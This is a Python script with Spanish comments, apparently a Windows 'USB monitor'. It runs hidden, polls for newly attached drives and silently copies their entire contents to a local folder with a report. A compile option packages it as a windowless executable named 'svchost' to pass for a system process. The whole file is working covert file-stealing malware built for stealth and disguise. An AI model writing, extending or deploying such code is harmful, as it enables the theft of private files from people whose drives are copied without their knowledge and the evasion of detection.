#!/usr/bin/env python3
"""
Monitor USB - Copia archivos de dispositivos USB automáticamente
Compilar: python monitor_usb.py --compile
Ejecutar: python monitor_usb.py
"""

import os
import shutil
import time
import sys
import ctypes
from datetime import datetime
from collections import defaultdict

# Directorio de destino donde se guardarán los archivos copiados
# EDITA ESTA LÍNEA CON TU RUTA DESEADA
DESTINO = r"C:\Users\elkin\Desktop\ESPE\test"
LOG_ARCHIVO = os.path.join(DESTINO, "reporte_usb.md")

# Crear la carpeta si no existe
if not os.path.exists(DESTINO):
    try:
        os.makedirs(DESTINO, exist_ok=True)
    except Exception as e:
        print(f"[ERROR] No se pudo crear carpeta destino: {DESTINO}")
        print(f"[ERROR] {str(e)}")
        sys.exit(1)

# Función para registrar en log silenciosamente
def registrar_log(contenido):
    """Registra eventos en archivo de log sin mostrar en consola"""
    try:
        with open(LOG_ARCHIVO, 'a', encoding='utf-8') as f:
            f.write(contenido + "\n")
    except Exception:
        pass

# Ocultar ventana de consola (si existe)
def ocultar_consola():
    """Oculta la ventana de consola completamente usando ctypes"""
    try:
        # Usar ctypes para ocultar la consola de forma más limpia
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleDisplayMode(kernel32.GetStdHandle(-11), 0, None)
    except Exception as e:
        registrar_log(f"[INFO] No se pudo ocultar consola: {str(e)}")
        pass

# Función para obtener extensión de archivo
def obtener_extension(nombre_archivo):
    """Extrae la extensión del archivo"""
    if '.' in nombre_archivo:
        return nombre_archivo.split('.')[-1].lower()
    return "sin_extension"

# Función para obtener tamaño legible
def formato_tamaño(bytes):
    """Convierte bytes a formato legible (KB, MB, GB)"""
    for unidad in ['B', 'KB', 'MB', 'GB']:
        if bytes < 1024:
            return f"{bytes:.2f} {unidad}"
        bytes /= 1024
    return f"{bytes:.2f} TB"

# Función para copiar archivos y carpetas manteniendo la estructura
def procesar_usb_silencioso(ruta_usb):
    """Copia archivos del USB manteniendo estructura y genera reporte"""
    try:
        estadisticas = {
            'total_archivos': 0,
            'total_carpetas': 0,
            'tamaño_total': 0,
            'tipos_archivo': defaultdict(int),
            'tamaños_tipo': defaultdict(int),
            'archivos_copiados': 0,
            'errores': 0,
            'estructura_usb': []
        }

        # Recopilar todos los archivos con su información
        archivos_a_copiar = []
        
        for root, dirs, files in os.walk(ruta_usb):
            estadisticas['total_carpetas'] += len(dirs)
            relative_path = os.path.relpath(root, ruta_usb)
            
            # Crear estructura en destino
            destino_carpeta = os.path.join(DESTINO, relative_path)
            if not os.path.exists(destino_carpeta):
                os.makedirs(destino_carpeta)

            # Recopilar información de archivos
            for archivo in files:
                try:
                    ruta_origen = os.path.join(root, archivo)
                    ruta_destino = os.path.join(destino_carpeta, archivo)
                    
                    # Información del archivo
                    tamaño = os.path.getsize(ruta_origen)
                    extension = obtener_extension(archivo)
                    
                    # Actualizar estadísticas
                    estadisticas['total_archivos'] += 1
                    estadisticas['tamaño_total'] += tamaño
                    estadisticas['tipos_archivo'][extension] += 1
                    estadisticas['tamaños_tipo'][extension] += tamaño
                    
                    # Registrar ruta relativa
                    ruta_relativa = os.path.relpath(ruta_origen, ruta_usb)
                    estadisticas['estructura_usb'].append(ruta_relativa)
                    
                    # Agregar a lista con tamaño para ordenar
                    archivos_a_copiar.append((tamaño, ruta_origen, ruta_destino))
                    
                except Exception:
                    estadisticas['errores'] += 1

        # Ordenar archivos por tamaño ascendente (pequeños primero, pesados al final)
        archivos_a_copiar.sort(key=lambda x: x[0])
        
        # Copiar archivos en orden (pequeños primero)
        for tamaño, ruta_origen, ruta_destino in archivos_a_copiar:
            try:
                shutil.copy2(ruta_origen, ruta_destino)
                estadisticas['archivos_copiados'] += 1
            except Exception:
                estadisticas['errores'] += 1

        return estadisticas

    except Exception:
        return None

# Función para generar reporte en markdown
def generar_reporte_markdown(estadisticas, ruta_usb, timestamp):
    """Genera un reporte detallado en formato Markdown"""
    if not estadisticas:
        return

    reporte = f"""
# Reporte de Copia USB - {timestamp}

## Información General
- **Unidad USB**: {ruta_usb}
- **Directorio Destino**: {DESTINO}
- **Fecha y Hora**: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}

## Estadísticas de Copia
- **Total de Archivos**: {estadisticas['total_archivos']}
- **Total de Carpetas**: {estadisticas['total_carpetas']}
- **Archivos Copiados**: {estadisticas['archivos_copiados']}
- **Errores**: {estadisticas['errores']}
- **Tamaño Total**: {formato_tamaño(estadisticas['tamaño_total'])}

## Distribución por Tipo de Archivo
"""
    
    # Agregar tabla de tipos de archivo
    reporte += "| Tipo | Cantidad | Tamaño |\n|------|----------|--------|\n"
    for ext in sorted(estadisticas['tipos_archivo'].keys()):
        cantidad = estadisticas['tipos_archivo'][ext]
        tamaño = formato_tamaño(estadisticas['tamaños_tipo'][ext])
        reporte += f"| .{ext} | {cantidad} | {tamaño} |\n"

    reporte += f"\n## Estructura del USB\n```\n"
    for archivo in sorted(estadisticas['estructura_usb'])[:100]:  # Primeros 100 archivos
        reporte += f"{archivo}\n"
    
    if len(estadisticas['estructura_usb']) > 100:
        reporte += f"... y {len(estadisticas['estructura_usb']) - 100} archivos más\n"
    
    reporte += "```\n\n---\n"

    registrar_log(reporte)

# Detectar dispositivos USB silenciosamente
def obtener_unidades_conectadas():
    """Obtiene lista de unidades escaneando el sistema de archivos (100% silencioso)"""
    unidades = set()
    try:
        # Escanear todas las letras de unidad posibles (C-Z)
        for letra in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            path = f"{letra}:\\"
            try:
                # Verificar si la unidad existe y es accesible
                if os.path.exists(path) and os.access(path, os.R_OK):
                    unidades.add(path)
            except Exception:
                pass
    except Exception as e:
        registrar_log(f"[ERROR] Error obteniendo unidades: {str(e)}")
    
    return unidades

def monitorear_dispositivos_usb():
    """Monitorea conexión de dispositivos USB silenciosamente"""
    try:
        registrar_log(f"\n[INICIO] Monitor USB iniciado - {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
        
        unidades_previas = obtener_unidades_conectadas()
        registrar_log(f"[INFO] Unidades detectadas al inicio: {unidades_previas}")

        contador_ciclos = 0
        while True:
            try:
                time.sleep(5)
                contador_ciclos += 1
                
                unidades_actuales = obtener_unidades_conectadas()
                nuevas_unidades = unidades_actuales - unidades_previas

                if nuevas_unidades:
                    registrar_log(f"\n[DETECCIÓN] {len(nuevas_unidades)} nueva(s) unidad(es) detectada(s): {nuevas_unidades}")
                    
                    for unidad in nuevas_unidades:
                        registrar_log(f"[PROCESANDO] Procesando unidad: {unidad}")
                        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                        
                        try:
                            # Procesar USB silenciosamente
                            estadisticas = procesar_usb_silencioso(unidad)
                            
                            if estadisticas and estadisticas['total_archivos'] > 0:
                                registrar_log(f"[COPIA EXITOSA] {estadisticas['archivos_copiados']} archivos copiados de {unidad}")
                                generar_reporte_markdown(estadisticas, unidad, timestamp)
                            else:
                                registrar_log(f"[ADVERTENCIA] No se encontraron archivos en {unidad}")
                        except Exception as e:
                            registrar_log(f"[ERROR] Error procesando {unidad}: {str(e)}")
                
                unidades_previas = unidades_actuales
                
            except KeyboardInterrupt:
                registrar_log(f"[PARADA] Monitor detenido por el usuario")
                break
            except Exception as e:
                registrar_log(f"[ERROR] Error en ciclo de monitoreo: {str(e)}")
                time.sleep(10)
                
    except Exception as e:
        registrar_log(f"[ERROR CRÍTICO] Fallo en monitorear_dispositivos_usb: {str(e)}")
        raise

def compilar_ejecutable():
    """Compila el script a un ejecutable .exe 100% oculto"""
    try:
        import PyInstaller.__main__
    except ImportError:
        print("[!] Error: PyInstaller no está instalado")
        print("[!] Instala con: pip install pyinstaller")
        return False
    
    # Ruta del script principal
    script_principal = os.path.abspath(__file__)
    
    # Nombre del ejecutable
    nombre_exe = "svchost"
    
    # Argumentos de PyInstaller (totalmente oculto sin abrir nada)
    argumentos = [
        script_principal,
        "--onefile",
        "--windowed",
        "--noconsole",
        f"--name={nombre_exe}",
        "--distpath=.",
        "--specpath=build",
        "--workpath=build",
        "--noupx",
    ]
    
    print("[*] Compilando ejecutable oculto...")
    
    try:
        PyInstaller.__main__.run(argumentos)
        
        archivo_final = f"{os.path.dirname(script_principal)}\\{nombre_exe}.exe"
        
        if os.path.exists(f"{nombre_exe}.exe"):
            shutil.move(f"{nombre_exe}.exe", archivo_final)
            print("[✓] Compilación exitosa")
            print(f"[✓] Archivo: {archivo_final}")
            return True
        else:
            print("[!] Error: No se generó el ejecutable")
            return False
            
    except Exception as e:
        print(f"[!] Error en compilación: {e}")
        return False

if __name__ == "__main__":
    # Verificar si se pasa argumento de compilación
    if len(sys.argv) > 1 and sys.argv[1] == "--compile":
        compilar_ejecutable()
    else:
        try:
            ocultar_consola()
            registrar_log("\n" + "="*60)
            registrar_log(f"[INICIO DEL PROGRAMA] {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
            registrar_log("="*60)
            monitorear_dispositivos_usb()
        except Exception as e:
            registrar_log(f"[ERROR] Excepción no capturada: {str(e)}")
            import traceback
            registrar_log(traceback.format_exc())
